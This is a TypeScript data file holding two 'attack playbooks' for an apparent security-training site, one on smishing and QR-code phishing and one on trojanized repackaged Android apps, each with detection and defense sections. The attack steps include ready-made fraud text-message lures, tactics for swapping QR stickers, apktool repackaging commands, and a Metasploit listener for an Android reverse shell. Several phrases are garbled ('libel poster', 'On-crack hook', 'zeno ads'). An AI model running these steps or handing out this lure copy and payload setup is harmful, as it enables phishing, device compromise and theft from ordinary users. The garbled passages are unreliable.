import type { AttackPlaybook } from "../types";

export const ATTACK_PLAYBOOKS_1B: AttackPlaybook[] = [
  {
    slug: "smishing-qr-phish",
    title: "Smishing & QR-code phishing",
    icon: "📲",
    category: "social",
    summary:
      "A fake SMS or a QR code on a sticker/poster sends the victim straight into a phishing page — no email filters involved, and the URL is invisible to the eye.",
    target: "Phone users; QR attacks hit anyone scanning a poster, menu, charger or parking sign.",
    impact:
      "Same as phishing (credentials, MFA bypass, account takeover) but with delivery channels that skip spam filters entirely.",
    tools: ["gophish", "socialfish", "evilginx", "set"],
    introMd: `Phishing's two stealthiest delivery channels squeeze out the usual guards:

- **Smishing** — the \`SMS\` version. Texts arrive in the *Messages* app, where no SPF/DKIM exists, no spam filter lives, and people trust the icon. The ask is short and urgent: "Your parcel is held — confirm address", "Bank: unauthorised login detected", "Your number expires".
- **QR phishing (quishing)** — a QR code is a URL with the string hidden. Printed on a parking meter, a libel poster, a fake "device not working" note, stuck on a sign, in a restaurant menu or a charger — when scanned, the *phone's camera* decodes it straight into the attacker's page. The victim never reads a domain because there is none to read.

Both share one trick: **the click happens in a context where the URL is invisible or irrelevant**, then the normal phish takes over.

> All playbooks are how *attackers* operate — you practice them only on systems/accounts you own or have written scope to test.`,
    steps: [
      {
        title: "Build the landing page",
        md: `Reuse the same clone machinery as direct phishing (\`set\` site cloner, \`evilginx\` for cookie-stealing proxies, \`gophish\` for tracking).

For SMS the page needs even less: a single "login/verify" form, a parcel-tracking mock, a rewards page. Fewer fields = more victims.

\`\`\`bash
# gophish: create the landing page, add the "submit" action,
# and it will record which number opened + what each one typed
\`\`\`

QR playbooks just need the page reachable on the phone — set the frame to the mobile viewport so it looks native.`,
      },
      {
        title: "Write the hook in 160 characters… or less",
        md: `Smishing copy proven in the wild:

- **Package**: "Parcel #3841 could not be delivered — confirm your address or it's returned: \<link\>". No store can be reached, no number to call back — a one-way wall of urgency.
- **Bank/OTP**: "Fraud attempt on your account. Cancel it here: \<link\> or your card is frozen".
- **"Your number expires / SIM updated"** — especially potent because losing a SIM is scary.
- **Invoice / salary / HR updates** during payroll week.

Mass texting is cheap; most platforms rotate to stay under carriers' radars. \`gophish\` supports SMS campaigns and gives you open/click/submit conversion numbers so operators tune the copy — the *conversion report* is the "hack improvement loop".`,
      },
      {
        title: "Plant the QR",
        md: `QR delivery beats SMS filters entirely because the attacker never has to send anything automated:

- **Poster / poster-device**: "Free Wi-Fi" or "This machine down — scan for support" stickers that redirect to the clone.
- **Payment pivots**: "scan to pay", fake change-the-URL stickers on donation jars, charging stations, EV chargers.
- **Menu / table QR** at a venue swapped for the attacker's link.
- **Email QR** — the QR smuggles a malicious URL *past* URL scanners that inspect the text body.

\`\`\`bash
# any QR encoder works: encode the phish URL into a qr.png, then print it
# qrencode -o sticker.png 'https://clone.example/login' --foreground=000 --background=FFF
\`\`\`

A QR code carries the URL invisibly — that opacity is the point of the attack.`,
      },
      {
        title: "Collect & ride the session",
        md: `The victim's phone does the work:

1. Camera scans → browser opens → clone loads (mobile-perfect).
2. Phone users are _less_ hostile to mobile login walls than desktop users; the "success" message that follows the harvest keeps the page credible.
3. Credentials land in the listener (SET console / gophish campaign data / evilginx cookie dump).

For QR at scale, the attacker **re-encodes a fresh URL every ~24h** so the old QR stops resolving, and logs via analytics which geographies/handsets convert best — then targets those.`,
      },
    ],
    detectionMd: `- **Look for domains inside texts at all** — legitimate delivery messages link to a terse, known hostname or nothing; most send an app notification instead.
- **Never scan a QR you didn't ask for.** Check for stickers layered *over* an existing official QR (the most common tamper).
- On your own posters/devices: check daily for added stickers/overlay QRs (A4 test here).
- **Server side**: monitor for mass link-scan subscriptions (sms bomb style) and for login-URLs delivered via SMS/QR-hit bursts; the cell-tower-to-web drop pattern shows in NDR/anomaly reports.
- **The universal detector**: any "log in now" dialog that you didn't initiate is the anomaly.`,
    defenseMd: `1. Treat SMS like email: never click. If it matters, open the app/site yourself.
2. **Check the URL after scan** — a long stack of random chars = phish, whatever the QR's frame design claims.
3. For orgs: mobile MDM + on-device enterprise VPN/DNS sink for known-quishing domains; brief users on overlay-QR tampering.
4. Report the text ("419/Phishing report") and the sticker; numbers get burned and posters get removed the same day it's reported.
5. Use the "legit site" habit everywhere: type the domain, don't trust the vector.

**Rule of thumb:** scanners read QRs, humans read URLs — quishing works because it moves the *decision* to a device that can't read.`,
  },
  {
    slug: "trojanized-update-app",
    title: "Trojanized update / repackaged app",
    icon: "🤖",
    category: "mobile",
    summary:
      "The attacker ships a fake 'update' or repackaged copy of a familiar app; it behaves normally while quietly running a remote-access payload or data stealer in the background.",
    target: "Users of a specific app (games, messaging, PDF tools) contacted about an 'update'.",
    impact:
      "Persistent silent access — files, notifications, keystrokes or banking data — while the app still looks and works completely normal.",
    tools: ["msfvenom", "apktool", "metasploit", "dex2jar", "seclists"],
    introMd: `The hardest phish to spot is one that *works normally*. A trojanized app opens, runs, and behaves like the real thing — because it mostly is. The attacker takes a genuine app, injects a payload ("repackage"), or crafts a fake that mirrors it, then sells the story: *update*, *crack*, *premium unlock*, *beta*.

> Run this only on your own devices/emulators, in an authorised-lab setting.`,
    steps: [
      {
        title: "Repackage a real app",
        md: `\`\`\`bash
apktool d RealGame.apk          # decompile to smali/ + resources
# 1) hostage the entry: insert payload calls into MainActivity / Application.onCreate
#    or route the network traffic through your payload class
# 2) keep permissions the app legitimately needs + add INTERNET (usually already there)
apktool b RealGame -o Fake_Update.apk
\`\`\`

The security log tells defenders to look for: **a repackaged signature + execution hook in the app's own classes**. Run \`dex2jar\` over the output and diff the classes against the store release — the diff *is the malware*.

Two bonuses attackers use:

- **Runtime remove**: payload bytes sit in a QR/asset and load from memory, so disk scan sees a clean app.
- **On-crack hook**: reads the device, batches exfil over normal HTTPS to a domain that mirrors \`cdn.<appname>.com\` — looks like the app's own analytics traffic.`,
      },
      {
        title: "Fake updates & store lookalikes",
        md: `Delivery uses the app's own reputation:

- A genuine user asked "update your app here" — the URL pasted in chat is the clone.
- A **lookalike store page** (zeno ads replicating the Play listing) pushes \`Update\` → APK download.
- A **compromised third-party store or modded-app site** hosts it.
- A **fake beta-invite** for apps people desperately want (early access).

The app icon, name, version number and install screen come straight from the real store listing, so the install-time check ("is this the real one?") passes for most users.`,
      },
      {
        title: "Payload fires on first open",
        md: `\`\`\`bash
# listener side:
msfconsole -q
use multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
exploit -j
\`\`\`

The repacked app's entry point calls home *while also* launching the legitimate UI. The victim sees the game boot, the attacker sees \`sessions -l\` populate hours later during the same check. Persistence: the payload survives reboots, and the moment Android revokes nothing (system app paths, or a "Disable apps" trick), the beacon just returns at next boot.

Because the app genuinely works, the device rarely gets wiped and the session stays for weeks — the "invisible" trojan is the most expensive one for defenders.`,
      },
    ],
    detectionMd: `- **Signature vs store lineage**: repackaged apps fail \`v2/v3\` signature checks or carry a different signer than the store release.
- Play Protect "Unsafe app" / "This app was downloaded from an untrusted source" banners.
- Background data churn to a *single foreign* hostname while idle.
- An app reinstalled recently (check \`Settings → Apps → … → App info\`: "last updated"/"verified") that you never deliberately updated.
- On Android: \`Developer options → Running services\` may show a service you didn't expect.
- Orgs: block sideloading via device policy; MDM quarantine on unrecognised installs.`,
    defenseMd: `1. Updates come from the store or the app's official site only — never from a link in chat/SMS.
2. **Check the signer**: installers, store APIs and package scanners (\`apksigner verify\`, Play Integrity) expose mismatches.
3. Keep **Play Protect on** — it catches the mass-produced variants.
4. **Uninstall anything "unknown source"**; force-stop + uninstall if battery/data allergy persists.
5. Work devices: MDM + device policy to forbid sideloading entirely.

**One-line guard:** a real app update never asks you to "install this APK" over DM — the store already does it silently.`,
  },
];